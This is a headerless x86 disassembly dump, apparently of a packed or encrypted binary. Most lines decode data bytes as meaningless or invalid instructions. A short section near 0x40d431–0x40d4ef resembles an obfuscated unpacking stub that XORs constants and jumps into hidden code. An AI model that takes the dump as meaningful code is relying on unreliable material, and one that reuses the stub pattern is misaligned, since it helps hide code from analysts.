  40ce36:	sub    ebp,DWORD PTR [ecx+eiz*4]
  40ce39:	pop    ss
  40ce3a:	cwde   
  40ce3b:	sub    dh,al
  40ce3d:	sub    dh,BYTE PTR [ebp-0x6dd01e3e]
  40ce43:	je     0x40ce14
  40ce45:	adc    ch,BYTE PTR [esi+0xb]
  40ce48:	cmp    ebx,ebp
  40ce4a:	std    
  40ce4b:	test   eax,0xc41dd90
  40ce50:	jo     0x40ceac
  40ce52:	ret    
  40ce53:	aaa    
  40ce54:	add    eax,0x502ef9e
  40ce59:	pop    es
  40ce5a:	retf   
  40ce5b:	ror    BYTE PTR ds:0xf9f35868,1
  40ce61:	fldenv [ebp+0xdc71248]
  40ce67:	sbb    ebp,DWORD PTR [edi+0x6]
  40ce6a:	mov    al,0xaf
  40ce6c:	push   0xb3c73aa3
  40ce71:	daa    
  40ce72:	sti    
  40ce73:	in     eax,dx
  40ce74:	xchg   DWORD PTR [ecx+0x417f35d2],edi
  40ce7a:	dec    esp
  40ce7b:	xchg   edi,eax
  40ce7c:	xor    DWORD PTR [ebp-0x77],ecx
  40ce7f:	mov    ds:0x26cc162c,eax
  40ce84:	(bad)  
  40ce85:	in     al,0xb
  40ce87:	ins    DWORD PTR es:[edi],dx
  40ce88:	mov    ah,0xe5
  40ce8a:	push   ds
  40ce8b:	sbb    eax,0xc76b811
  40ce90:	lods   al,BYTE PTR ds:[esi]
  40ce91:	shl    ch,0x6b
  40ce94:	faddp  st(1),st
  40ce96:	mov    al,0xb2
  40ce98:	cmp    BYTE PTR [ebx+ebp*8],0x9b
  40ce9c:	repz xor al,0x7f
  40ce9f:	inc    esp
  40cea0:	lock mov ebx,0x8742bb0e
  40cea6:	ret    
  40cea7:	addr16 fwait
  40cea9:	mov    esp,0x7896da0
  40ceae:	push   es
  40ceaf:	xchg   edx,eax
  40ceb0:	fcomi  st,st(2)
  40ceb2:	aaa    
  40ceb3:	js     0x40cef1
  40ceb5:	push   0x7d
  40ceb7:	outs   dx,BYTE PTR ds:[esi]
  40ceb8:	mov    ebx,0x53610049
  40cebd:	sub    ch,BYTE PTR [esi]
  40cebf:	outs   dx,BYTE PTR ds:[esi]
  40cec0:	or     BYTE PTR [edx],bh
  40cec2:	cmp    eax,0x38a67e16
  40cec7:	iret   
  40cec8:	mov    ds:0x3c79cd6c,al
  40cecd:	mov    ds:0x84b628b5,eax
  40ced2:	pop    eax
  40ced3:	xchg   DWORD PTR [ecx+ecx*8-0x44f5f4f8],edx
  40ceda:	pop    esp
  40cedb:	add    eax,0x57029e9c
  40cee0:	in     eax,0xbb
  40cee2:	out    0x4c,eax
  40cee4:	mov    esp,0x92d889c6
  40cee9:	xchg   edi,eax
  40ceea:	stos   BYTE PTR es:[edi],al
  40ceeb:	jp     0x40cede
  40ceed:	out    0xb3,al
  40ceef:	aad    0x5
  40cef1:	sbb    BYTE PTR [esi+0x78],al
  40cef4:	or     edx,DWORD PTR [edx-0x56]
  40cef7:	cmp    BYTE PTR [ecx],dh
  40cef9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cefa:	xchg   ecx,eax
  40cefb:	stos   BYTE PTR es:[edi],al
  40cefc:	xchg   edx,eax
  40cefd:	add    eax,0xd29f4d85
  40cf02:	dec    ebx
  40cf03:	(bad)  
  40cf04:	mov    dh,0xe3
  40cf06:	retf   
  40cf07:	jne    0x40cea8
  40cf09:	jnp    0x40cf23
  40cf0b:	adc    edi,0x40d92d8a
  40cf11:	xor    BYTE PTR [ebx-0x160592da],cl
  40cf17:	(bad)  
  40cf18:	(bad)  
  40cf19:	mov    edi,0xf9c100e6
  40cf1e:	add    al,BYTE PTR [ebx]
  40cf20:	xchg   edx,eax
  40cf21:	xchg   ecx,eax
  40cf22:	mov    eax,ds:0x8450ac86
  40cf27:	daa    
  40cf28:	mov    al,ds:0x983b750d
  40cf2d:	fs jne 0x40cf10
  40cf30:	cmp    eax,0x663589cb
  40cf35:	(bad)  
  40cf37:	fdiv   QWORD PTR [ebx-0x75]
  40cf3a:	popa   
  40cf3b:	shl    BYTE PTR [eax+edi*2-0x7e],1
  40cf3f:	call   0xb5a52430
  40cf44:	std    
  40cf45:	and    DWORD PTR [eax-0x77],esp
  40cf48:	mov    esp,0x44e83394
  40cf4d:	mov    edx,0xa44070f
  40cf52:	iret   
  40cf53:	mov    al,0x8b
  40cf55:	and    DWORD PTR [ecx+0x4a],0x51
  40cf59:	jg     0x40cefd
  40cf5b:	clc    
  40cf5c:	outs   dx,DWORD PTR ds:[esi]
  40cf5d:	aas    
  40cf5e:	xchg   ebx,eax
  40cf5f:	scas   eax,DWORD PTR es:[edi]
  40cf60:	mov    ds:0x1be13280,eax
  40cf65:	dec    esi
  40cf66:	dec    cx
  40cf68:	xor    DWORD PTR [ebx],ecx
  40cf6a:	or     esp,DWORD PTR [ebp+0x5c0a2bc9]
  40cf70:	cmp    ch,BYTE PTR [ecx-0x32]
  40cf73:	add    al,0x3d
  40cf75:	ss cdq 
  40cf77:	das    
  40cf78:	aas    
  40cf79:	daa    
  40cf7a:	and    esi,DWORD PTR [ebp+eiz*4-0x27]
  40cf7e:	mov    al,ds:0x3a4cf538
  40cf83:	sti    
  40cf84:	and    eax,0x47a5265c
  40cf89:	mov    esp,0xac3b5f5
  40cf8e:	add    cl,BYTE PTR [edx]
  40cf90:	jl     0x40cfa8
  40cf92:	xor    dh,0xf0
  40cf95:	sahf   
  40cf96:	add    dl,bh
  40cf98:	xor    DWORD PTR [eax],0xd95b7e8f
  40cf9e:	das    
  40cf9f:	push   esp
  40cfa0:	ins    BYTE PTR es:[edi],dx
  40cfa1:	or     al,0x53
  40cfa3:	out    0xd0,al
  40cfa5:	sub    al,BYTE PTR [ebp+0x30]
  40cfa8:	mov    edx,0x64e68cf1
  40cfad:	sar    DWORD PTR [ebx-0x56],0x35
  40cfb1:	push   cs
  40cfb2:	addr16 jl 0x40cfa9
  40cfb5:	stos   DWORD PTR es:[edi],eax
  40cfb6:	retf   0x613f
  40cfb9:	arpl   WORD PTR es:[esi-0x42],ax
  40cfbd:	fcomp  QWORD PTR [eax+0x37]
  40cfc0:	pushf  
  40cfc1:	push   0x7c588d3
  40cfc6:	sbb    al,0xfe
  40cfc8:	mov    esp,0x496fd102
  40cfcd:	cmp    al,0xa5
  40cfcf:	dec    ebx
  40cfd0:	adc    bh,BYTE PTR [ecx+0x1]
  40cfd3:	mov    DWORD PTR [edi],edx
  40cfd5:	pop    ecx
  40cfd6:	pop    ss
  40cfd7:	xchg   DWORD PTR [ebp+0x17],ebx
  40cfda:	sbb    al,0xf7
  40cfdc:	outs   dx,DWORD PTR ds:[esi]
  40cfdd:	or     al,0x19
  40cfdf:	push   es
  40cfe0:	inc    eax
  40cfe1:	mov    edx,0xb029f8c5
  40cfe6:	sar    BYTE PTR [ebx+0x7e],cl
  40cfe9:	pop    edx
  40cfea:	scas   al,BYTE PTR es:[edi]
  40cfeb:	sub    al,al
  40cfed:	pusha  
  40cfee:	repz sub al,0x58
  40cff1:	or     eax,0x251221ec
  40cff6:	iret   
  40cff7:	les    edi,FWORD PTR [edx]
  40cff9:	xchg   edi,eax
  40cffa:	ds retf 
  40cffc:	test   eax,0x3946c2a4
  40d001:	add    eax,0x8a3c2082
  40d006:	sub    eax,0xd0eb61d
  40d00b:	leave  
  40d00c:	xor    esi,DWORD PTR [esi+ebp*2+0x58]
  40d010:	push   eax
  40d011:	arpl   si,bp
  40d013:	test   BYTE PTR [ebp+ebx*4-0x456a5bd4],bh
  40d01a:	fcom   DWORD PTR [ecx]
  40d01c:	sbb    eax,0x6309a47e
  40d021:	or     esp,DWORD PTR [esi]
  40d023:	add    al,0xed
  40d025:	pop    ebp
  40d026:	mov    esi,0x6edee10e
  40d02b:	add    al,dh
  40d02d:	xchg   esp,eax
  40d02e:	xor    edi,DWORD PTR [edx-0x13dd371f]
  40d034:	ffreep st(2)
  40d036:	retf   0x31e4
  40d039:	cmp    eax,0x480ad8a7
  40d03e:	ds jle 0x40d093
  40d041:	add    BYTE PTR [edi-0x40],ch
  40d044:	outs   dx,DWORD PTR ds:[esi]
  40d045:	popf   
  40d046:	mov    bh,0xfc
  40d048:	fs sbb eax,0xa870d282
  40d04e:	or     al,0x80
  40d050:	cmp    DWORD PTR [esi+ebp*2-0x1c],edx
  40d054:	shr    DWORD PTR [edi],cl
  40d056:	leave  
  40d057:	in     eax,0xee
  40d059:	push   esp
  40d05a:	es add al,0x3
  40d05d:	xlat   BYTE PTR ds:[ebx]
  40d05e:	add    BYTE PTR [esi+ebx*8+0x76614fa3],dh
  40d065:	cmp    bl,BYTE PTR [ebx+edi*4+0x48]
  40d069:	out    dx,al
  40d06a:	mov    ?,WORD PTR [esi]
  40d06c:	inc    edi
  40d06d:	xor    edi,DWORD PTR [ecx-0x60]
  40d070:	mov    ch,0xd1
  40d072:	daa    
  40d073:	aad    0xc7
  40d075:	test   eax,0x6086449a
  40d07a:	add    edx,DWORD PTR [esp+esi*8-0x45]
  40d07e:	xchg   edi,eax
  40d07f:	push   edx
  40d080:	adc    BYTE PTR [ebx],cl
  40d082:	inc    esi
  40d083:	scas   eax,DWORD PTR es:[edi]
  40d084:	(bad)  
  40d085:	jmp    0x40d0f0
  40d087:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d089:	dec    eax
  40d08a:	loope  0x40d0b4
  40d08c:	dec    esp
  40d08d:	or     ebx,DWORD PTR [ecx-0x2e3b5b4a]
  40d093:	xchg   edi,eax
  40d094:	pop    eax
  40d095:	cli    
  40d096:	sti    
  40d097:	(bad)  
  40d098:	nop
  40d099:	mov    eax,cs:0x665f9405
  40d09f:	scas   al,BYTE PTR es:[edi]
  40d0a0:	addr16 jne 0x40d085
  40d0a3:	scas   eax,DWORD PTR es:[edi]
  40d0a4:	inc    edi
  40d0a5:	loope  0x40d066
  40d0a7:	(bad)  
  40d0a8:	mov    esi,0x733beaef
  40d0ad:	aaa    
  40d0ae:	push   esi
  40d0af:	add    eax,0x986ec62d
  40d0b4:	xor    al,0xa4
  40d0b6:	popf   
  40d0b7:	adc    eax,0x8e27c99b
  40d0bc:	out    dx,al
  40d0bd:	es pop ds
  40d0bf:	inc    edx
  40d0c0:	dec    esi
  40d0c1:	push   ebp
  40d0c2:	mov    al,0xca
  40d0c4:	out    dx,eax
  40d0c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0c6:	lods   al,BYTE PTR ds:[esi]
  40d0c7:	lock test al,0x67
  40d0ca:	add    BYTE PTR [edi+0x21],al
  40d0cd:	test   WORD PTR [ebp+0x27],bx
  40d0d1:	inc    edi
  40d0d2:	ds (bad) 
  40d0d4:	mov    esi,0x30bc8e8a
  40d0d9:	ins    DWORD PTR es:[edi],dx
  40d0da:	enter  0x2323,0x57
  40d0de:	neg    BYTE PTR [esi]
  40d0e0:	cli    
  40d0e1:	outs   dx,BYTE PTR ds:[esi]
  40d0e2:	btc    eax,esp
  40d0e5:	leave  
  40d0e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0e7:	xor    BYTE PTR [eax],bl
  40d0e9:	adc    esp,ebx
  40d0eb:	fdivr  DWORD PTR [edx]
  40d0ed:	out    dx,al
  40d0ee:	rcl    BYTE PTR [ebx],0xdf
  40d0f1:	cwde   
  40d0f2:	jmp    0x40d0db
  40d0f4:	ds pop edi
  40d0f6:	cmp    edi,ebp
  40d0f8:	push   0x184b8da5
  40d0fd:	fisttp QWORD PTR [ebx]
  40d0ff:	sub    ch,BYTE PTR ds:0xfa4643ea
  40d105:	mov    eax,0x718dc7c0
  40d10a:	push   ebx
  40d10b:	lahf   
  40d10c:	or     BYTE PTR [edi],bh
  40d10e:	pop    ds
  40d10f:	xchg   ebp,eax
  40d110:	or     al,BYTE PTR [ebx+0x6fa85393]
  40d116:	test   ebp,edx
  40d118:	cmc    
  40d119:	mov    ds:0x2eb2af21,al
  40d11e:	test   esi,ecx
  40d120:	ins    DWORD PTR es:[edi],dx
  40d121:	in     al,dx
  40d122:	lahf   
  40d123:	repz dec ecx
  40d125:	sar    esp,1
  40d127:	jl     0x40d175
  40d129:	jb     0x40d0cc
  40d12b:	fucomp st(4)
  40d12d:	sub    DWORD PTR [ebx+eax*8-0x35],eax
  40d131:	iret   
  40d132:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d133:	or     al,0xf8
  40d135:	nop
  40d136:	mov    bl,BYTE PTR [edi-0xb54c1a8]
  40d13c:	pushf  
  40d13d:	and    al,0x50
  40d13f:	push   ebx
  40d140:	inc    edi
  40d141:	sbb    BYTE PTR [ecx+0x43ea42a4],bh
  40d147:	sar    DWORD PTR [ebp+0x10],0x65
  40d14b:	out    0x3b,al
  40d14d:	cdq    
  40d14e:	mov    ds:0x79d9d637,eax
  40d153:	sbb    BYTE PTR [eax+0x1f],bl
  40d156:	xor    DWORD PTR [esi-0x79],esp
  40d159:	inc    ebx
  40d15a:	leave  
  40d15b:	(bad)  
  40d15c:	jmp    DWORD PTR [ebx-0x4cc8019]
  40d162:	lods   eax,DWORD PTR ds:[esi]
  40d163:	out    0x71,eax
  40d165:	ss add cl,dh
  40d168:	(bad)  
  40d169:	mov    ds:0xe00a7b0d,al
  40d16e:	xchg   edx,eax
  40d16f:	bound  ebx,QWORD PTR [ebp-0x31]
  40d172:	out    dx,eax
  40d173:	fneni(8087 only) 
  40d175:	push   ecx
  40d176:	inc    ecx
  40d177:	lea    edx,[eax+0x7a2891f3]
  40d17d:	xchg   edi,eax
  40d17e:	mov    edi,0x55761c11
  40d183:	icebp  
  40d184:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d185:	ja     0x40d1f4
  40d187:	stc    
  40d188:	mov    eax,ds:0xe10ae11c
  40d18d:	or     al,0x7f
  40d18f:	fucomp st(3)
  40d191:	ds out dx,al
  40d193:	add    DWORD PTR [ebx],eax
  40d195:	mov    eax,ds:0x85a4ce96
  40d19a:	sub    al,0xa5
  40d19c:	(bad)  
  40d19d:	push   cs
  40d19e:	int    0xea
  40d1a0:	add    dl,BYTE PTR [eax+0x301812fe]
  40d1a6:	add    ebp,DWORD PTR [edi+0x55]
  40d1a9:	ret    
  40d1aa:	mov    dh,0x20
  40d1ac:	je     0x40d1f4
  40d1ae:	sub    eax,0x290ac552
  40d1b3:	mov    ecx,0xd6e00cae
  40d1b8:	mov    ?,WORD PTR [ebp-0x77d23ee8]
  40d1be:	leave  
  40d1bf:	fild   WORD PTR [eax+eiz*2+0x782766cf]
  40d1c6:	sub    al,0xc0
  40d1c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1c9:	or     dh,BYTE PTR [edx+0x54ec874b]
  40d1cf:	test   BYTE PTR [ebx+ebp*2],0xfb
  40d1d3:	(bad)  
  40d1d4:	fcomp  st(1)
  40d1d6:	lds    edx,FWORD PTR [edx]
  40d1d8:	jp     0x40d1d2
  40d1da:	retf   0x1416
  40d1dd:	jns    0x40d174
  40d1df:	mov    edx,0xb29fa5aa
  40d1e4:	add    eax,0x1eb29921
  40d1e9:	dec    edx
  40d1ea:	adc    BYTE PTR [eax+0x662d43b8],bl
  40d1f0:	mov    eax,ds:0xc3c12194
  40d1f5:	jne    0x40d1f1
  40d1f7:	jg     0x40d24a
  40d1f9:	push   esp
  40d1fa:	fstp   DWORD PTR [ecx+0x77f7fd00]
  40d200:	pop    edx
  40d201:	in     al,dx
  40d202:	sub    al,0xe
  40d204:	xor    al,0xf0
  40d206:	daa    
  40d207:	jns    0x40d27d
  40d209:	loope  0x40d1ff
  40d20b:	out    0xc,eax
  40d20d:	stc    
  40d20e:	or     BYTE PTR [ebx],bh
  40d210:	push   eax
  40d211:	neg    DWORD PTR [ebx+0xe]
  40d214:	fs loope 0x40d1ae
  40d217:	enter  0x76fe,0x3b
  40d21b:	in     eax,dx
  40d21c:	push   eax
  40d21d:	dec    ebx
  40d21e:	mul    eax
  40d220:	pop    esp
  40d221:	cmp    edi,ebx
  40d223:	dec    ecx
  40d224:	mov    ch,ah
  40d226:	dec    edx
  40d227:	enter  0x4ba0,0x6a
  40d22b:	adc    BYTE PTR [ecx+0x4d],0x51
  40d22f:	fs fldl2t 
  40d232:	stos   DWORD PTR es:[edi],eax
  40d233:	test   eax,0x1d062a9f
  40d238:	out    0x31,eax
  40d23a:	retf   0x9b76
  40d23d:	loop   0x40d24b
  40d23f:	jo     0x40d206
  40d241:	jecxz  0x40d271
  40d243:	out    0x66,eax
  40d245:	call   0xd543:0xa1e25414
  40d24c:	sti    
  40d24d:	push   esp
  40d24e:	dec    edx
  40d24f:	ret    
  40d250:	sub    al,BYTE PTR [esi-0x1d]
  40d253:	cdq    
  40d254:	jnp    0x40d25d
  40d256:	popa   
  40d257:	test   al,0xf6
  40d259:	adc    ecx,DWORD PTR [esi+edx*2+0x4df47441]
  40d260:	repz or edx,eax
  40d263:	sbb    dh,BYTE PTR [esi+0x29]
  40d266:	fptan  
  40d268:	pop    ss
  40d269:	pop    ebp
  40d26a:	(bad)  
  40d26b:	out    0xc7,al
  40d26d:	fwait
  40d26e:	mov    ch,0xdc
  40d270:	lock cwde 
  40d272:	inc    ecx
  40d273:	cmc    
  40d274:	cld    
  40d275:	xor    eax,0x9c3a1fd5
  40d27a:	xor    edx,DWORD PTR [ecx-0x375c7f65]
  40d280:	or     BYTE PTR [esi+0x29be878],0x68
  40d287:	lock lods al,BYTE PTR ds:[esi]
  40d289:	mov    ds:0x1146bb35,al
  40d28e:	cmc    
  40d28f:	std    
  40d290:	les    esp,FWORD PTR [esp+edi*4+0x25]
  40d294:	rcl    BYTE PTR [ebx-0x5d],cl
  40d297:	cmp    esp,DWORD PTR [edx+0x1fca7c06]
  40d29d:	pop    ss
  40d29e:	fcmovnbe st,st(5)
  40d2a0:	sub    eax,0x45697d75
  40d2a5:	call   0x6bf94799
  40d2aa:	sti    
  40d2ab:	les    esi,FWORD PTR [edi-0x7f]
  40d2ae:	js     0x40d2b1
  40d2b0:	sub    al,0xcb
  40d2b2:	int3   
  40d2b3:	or     edi,edi
  40d2b5:	jno    0x40d2e1
  40d2b7:	xchg   esi,eax
  40d2b8:	inc    ecx
  40d2b9:	loopne 0x40d2ae
  40d2bb:	inc    ebx
  40d2bc:	das    
  40d2bd:	loopne 0x40d24b
  40d2bf:	das    
  40d2c0:	mov    gs,ebx
  40d2c2:	adc    ecx,DWORD PTR [edx+0x6bc4a026]
  40d2c8:	mov    ebp,ds
  40d2ca:	xchg   ebp,eax
  40d2cb:	cmc    
  40d2cc:	in     al,0x96
  40d2ce:	cld    
  40d2cf:	pusha  
  40d2d0:	das    
  40d2d1:	inc    ecx
  40d2d2:	ficomp DWORD PTR [esp+ebx*8-0x69]
  40d2d6:	call   0x44f7f5e6
  40d2db:	sub    bl,BYTE PTR [ebx-0x5a]
  40d2de:	add    al,0xbf
  40d2e0:	mov    ds:0xf889001d,eax
  40d2e5:	sub    ch,BYTE PTR [ecx]
  40d2e7:	mov    gs,WORD PTR [ecx-0x760a095b]
  40d2ed:	jecxz  0x40d2c6
  40d2ef:	or     eax,0x33748ef1
  40d2f4:	scas   al,BYTE PTR es:[edi]
  40d2f5:	scas   al,BYTE PTR es:[edi]
  40d2f6:	call   0x6d93:0x1d52aa45
  40d2fd:	jmp    0xd8fe:0x5e03f24c
  40d304:	les    ecx,FWORD PTR [ecx-0x3c986672]
  40d30a:	mov    ds:0x17476f30,eax
  40d30f:	dec    BYTE PTR fs:[eax]
  40d312:	push   eax
  40d313:	les    edx,FWORD PTR [ebx+0x32102033]
  40d319:	mov    eax,ds:0x518ff805
  40d31e:	loop   0x40d37b
  40d320:	ins    BYTE PTR es:[edi],dx
  40d321:	rol    dh,1
  40d323:	jbe    0x40d353
  40d325:	retf   0x7eec
  40d328:	cmp    al,0xcd
  40d32a:	imul   edx,esp,0x9a7668b5
  40d330:	xor    al,0xd1
  40d332:	sub    al,0x25
  40d334:	dec    ebx
  40d335:	pop    ebx
  40d336:	and    eax,0x36babefe
  40d33b:	mov    ebx,0x834ee87d
  40d340:	sti    
  40d341:	dec    edx
  40d342:	pop    esi
  40d343:	dec    ecx
  40d344:	xchg   esi,eax
  40d345:	mov    ecx,0x271f6d8e
  40d34a:	adc    eax,DWORD PTR ds:0x56fe92d0
  40d350:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d351:	inc    esi
  40d352:	add    dl,BYTE PTR [edi]
  40d354:	mov    al,ds:0xe75d2b3f
  40d359:	jmp    0x8d6b:0x9ce6d4fd
  40d360:	test   al,0xcf
  40d362:	sbb    ecx,edx
  40d364:	jbe    0x40d3c8
  40d366:	or     DWORD PTR [eax+0x64fc4452],edx
  40d36c:	pop    edx
  40d36d:	mov    dl,0x3b
  40d36f:	add    DWORD PTR ds:0x4244c2bf,eax
  40d375:	xor    edi,DWORD PTR [ebp+0x14]
  40d378:	adc    esp,DWORD PTR [eax]
  40d37a:	xor    al,0xbd
  40d37c:	pmulhw mm3,QWORD PTR [esi+0x4f]
  40d380:	dec    esp
  40d381:	dec    edi
  40d382:	ins    BYTE PTR es:[edi],dx
  40d383:	adc    al,BYTE PTR [esi]
  40d385:	in     eax,dx
  40d386:	dec    eax
  40d387:	ins    BYTE PTR es:[edi],dx
  40d388:	sbb    DWORD PTR [esi-0x20],edx
  40d38b:	and    BYTE PTR ds:0xf08d1b11,0x86
  40d392:	cmp    al,0x9
  40d394:	jge    0x40d40c
  40d396:	ror    BYTE PTR [ebx+0x18],cl
  40d399:	inc    esp
  40d39a:	inc    edx
  40d39b:	jb     0x40d378
  40d39d:	push   edi
  40d39e:	adc    al,0x92
  40d3a0:	jmp    0x1944:0x566d296e
  40d3a7:	sbb    al,0x82
  40d3a9:	int3   
  40d3aa:	pop    eax
  40d3ab:	add    eax,0x1934169a
  40d3b0:	inc    esi
  40d3b1:	add    ch,al
  40d3b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3b4:	dec    ebp
  40d3b5:	dec    edi
  40d3b6:	add    ah,dh
  40d3b8:	loop   0x40d394
  40d3ba:	inc    edi
  40d3bb:	xchg   al,cl
  40d3bd:	inc    ebp
  40d3be:	leave  
  40d3bf:	shl    bh,1
  40d3c1:	mov    cl,0x51
  40d3c3:	mov    BYTE PTR [edx],ah
  40d3c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3c6:	pop    ebx
  40d3c8:	mov    bh,0x98
  40d3ca:	pusha  
  40d3cb:	xor    al,0xf0
  40d3cd:	sbb    bh,ch
  40d3cf:	jns    0x40d40d
  40d3d1:	out    dx,eax
  40d3d2:	call   FWORD PTR [esi]
  40d3d4:	ins    BYTE PTR es:[edi],dx
  40d3d5:	dec    edx
  40d3d6:	jg     0x40d3d8
  40d3d8:	adc    al,0x4c
  40d3da:	int3   
  40d3db:	out    dx,al
  40d3dc:	in     eax,dx
  40d3dd:	mov    ebp,0x3803bbad
  40d3e2:	ret    0x5495
  40d3e5:	(bad)  
  40d3e6:	mov    eax,0xd2f829c8
  40d3eb:	xchg   esi,eax
  40d3ec:	mov    ecx,0xc6852421
  40d3f1:	aad    0x28
  40d3f3:	dec    ecx
  40d3f4:	mov    ch,0x39
  40d3f6:	xor    al,0x4b
  40d3f8:	jg     0x40d3aa
  40d3fa:	mov    esi,0x2d7c1946
  40d3ff:	mov    bl,0xb
  40d401:	rcr    DWORD PTR [edi+0x23d16ca6],1
  40d407:	add    DWORD PTR [edx-0x1a],esi
  40d40a:	ja     0x40d3b8
  40d40c:	sub    eax,0x134700f9
  40d411:	in     al,0x59
  40d413:	(bad)  
  40d414:	lds    esp,FWORD PTR [ecx-0x49]
  40d417:	imul   ecx,DWORD PTR [eax-0x328bf058],0xf838cead
  40d421:	jnp    0x40d437
  40d423:	loopne 0x40d402
  40d425:	push   ds
  40d426:	mov    dl,0x51
  40d428:	jecxz  0x40d439
  40d42a:	scas   eax,DWORD PTR es:[edi]
  40d42b:	add    cl,BYTE PTR [ebx-0x2ecc03ab]
  40d431:	mov    ecx,DWORD PTR [ebp+0x8]
  40d434:	lea    ecx,[edx+ecx*1+0x3272db]
  40d43b:	cmp    ecx,eax
  40d43d:	je     0x40d4b4
  40d443:	mov    edi,DWORD PTR [ebp-0x14]
  40d446:	mov    eax,DWORD PTR [ebp+0x8]
  40d449:	mov    edx,DWORD PTR [ebp+0x14]
  40d44c:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d450:	mov    ecx,0x7510893
  40d455:	xor    edx,edx
  40d457:	xor    edi,ecx
  40d459:	mov    esi,0x3272db
  40d45e:	add    edi,esi
  40d460:	div    edi
  40d462:	mov    edx,DWORD PTR [ebp-0x4]
  40d465:	xor    edx,ecx
  40d467:	lea    eax,[edx+eax*1+0x3272db]
  40d46e:	mov    edx,DWORD PTR [ebp+0x8]
  40d471:	mov    edi,DWORD PTR [ebp-0x20]
  40d474:	mov    DWORD PTR [edi+edx*4],eax
  40d477:	mov    eax,DWORD PTR [ebp-0x14]
  40d47a:	mov    edx,DWORD PTR [ebp+0x8]
  40d47d:	xor    eax,ecx
  40d47f:	lea    eax,[eax+edx*1+0x3272db]
  40d486:	mov    DWORD PTR [ebp+0x8],eax
  40d489:	mov    eax,DWORD PTR [ebp-0x14]
  40d48c:	mov    edx,DWORD PTR [ebp+0x14]
  40d48f:	xor    eax,ecx
  40d491:	add    eax,esi
  40d493:	imul   eax,DWORD PTR [edx]
  40d496:	mov    edx,DWORD PTR [ebp-0x4]
  40d499:	xor    edx,ecx
  40d49b:	mov    ecx,DWORD PTR [ebp+0x8]
  40d49e:	lea    ecx,[edx+ecx*1+0x3272db]
  40d4a5:	cmp    ecx,eax
  40d4a7:	jne    0x40d443
  40d4ad:	mov    eax,esi
  40d4af:	jmp    0x40d4b9
  40d4b4:	mov    eax,0x3272db
  40d4b9:	mov    ebx,0x7510893
  40d4be:	mov    ecx,DWORD PTR [ebp-0x4]
  40d4c1:	xor    ecx,ebx
  40d4c3:	add    ecx,eax
  40d4c5:	mov    DWORD PTR [ebp-0xc],ecx
  40d4c8:	mov    ebx,0x65655
  40d4cd:	add    ebx,0x3234
  40d4d3:	xchg   ebx,esi
  40d4d5:	xor    ebx,ebx
  40d4d7:	push   esi
  40d4d8:	mov    esi,ebx
  40d4da:	pop    ebx
  40d4db:	mov    edx,esi
  40d4dd:	add    ebx,0x1002
  40d4e3:	lea    eax,[ebp-0x10]
  40d4e6:	add    edx,eax
  40d4e8:	add    edx,0x5
  40d4eb:	push   edx
  40d4ec:	inc    esi
  40d4ed:	pop    ecx
  40d4ee:	dec    ecx
  40d4ef:	jmp    0x40f854
  40d4f4:	jl     0x40d532
  40d4f6:	pop    es
  40d4f7:	call   0xe49cb803
  40d4fc:	and    BYTE PTR [edi-0x5a58b123],0x59
  40d503:	mov    al,0xa0
  40d505:	shl    BYTE PTR [edx+0x62],cl
  40d508:	cmp    bl,BYTE PTR [edi+0x62]
  40d50b:	bound  esi,QWORD PTR [ecx]
  40d50d:	xlat   BYTE PTR ds:[ebx]
  40d50e:	sbb    al,0xb1
  40d510:	sbb    BYTE PTR [esi],ch
  40d512:	adc    edx,DWORD PTR [ebx-0x6e]
  40d515:	mov    edx,0xfc2375a8
  40d51a:	arpl   sp,di
  40d51c:	data16 out dx,al
  40d51e:	and    DWORD PTR [ebx-0x296185f8],eax
  40d524:	inc    esp
  40d525:	xchg   esi,eax
  40d526:	loop   0x40d554
  40d528:	mov    dh,dl
  40d52a:	sub    edi,DWORD PTR [eax]
  40d52c:	in     al,dx
  40d52d:	call   0x674a:0xf1010cc
  40d534:	adc    edi,ecx
  40d536:	push   ss
  40d537:	sti    
  40d538:	add    al,bl
  40d53a:	and    DWORD PTR [ebx+eiz*1],ecx
  40d53d:	sar    ebx,1
  40d53f:	jo     0x40d544
  40d541:	rcr    BYTE PTR [ecx],0x5f
  40d544:	dec    ebp
  40d545:	add    DWORD PTR ds:0x164e110d,ebp
  40d54b:	dec    ebx
  40d54c:	retf   
  40d54d:	pop    esi
  40d54e:	and    bh,BYTE PTR [edx+0x1e]
  40d551:	out    0x9d,eax
  40d553:	fdiv   st(1),st
  40d555:	mov    ss,esi
  40d557:	das    
  40d558:	ds adc ebx,esp
  40d55b:	sbb    al,0xe8
  40d55d:	cmp    DWORD PTR [ebx+0xe],ebp
  40d560:	call   0xe6ce:0x8ce6f967
  40d567:	cmp    DWORD PTR [edi+0x33a7f98d],ecx
  40d56d:	inc    ebx
  40d56e:	dec    eax
  40d56f:	inc    ecx
  40d570:	add    ebx,edx
  40d572:	push   ss
  40d573:	cmp    edx,DWORD PTR [eax-0x73]
  40d576:	cli    
  40d577:	nop
  40d578:	inc    esp
  40d579:	iret   
  40d57a:	test   BYTE PTR [esi+0x3cce0222],0x22
  40d581:	mov    dl,0xdd
  40d583:	jle    0x40d5e1
  40d585:	cmp    BYTE PTR [ebx+0x13],dl
  40d588:	jl     0x40d5f8
  40d58a:	clc    
  40d58b:	jnp    0x40d532
  40d58d:	xlat   BYTE PTR ds:[ebx]
  40d58e:	daa    
  40d58f:	or     BYTE PTR [ebp+0xd],al
  40d592:	mov    ds:0xdeeab2b0,al
  40d597:	xchg   edx,eax
  40d598:	sti    
  40d599:	call   0x4eaac117
  40d59e:	push   esp
  40d59f:	add    edx,ecx
  40d5a1:	jmp    0x4fe12838
  40d5a6:	pminub mm5,QWORD PTR [ecx-0x3d7e9932]
  40d5ad:	aam    0x3
  40d5af:	shl    cl,cl
  40d5b1:	adc    BYTE PTR [edx+0x6994d090],bh
  40d5b7:	scas   al,BYTE PTR es:[edi]
  40d5b8:	mov    al,0x35
  40d5ba:	outs   dx,BYTE PTR ds:[esi]
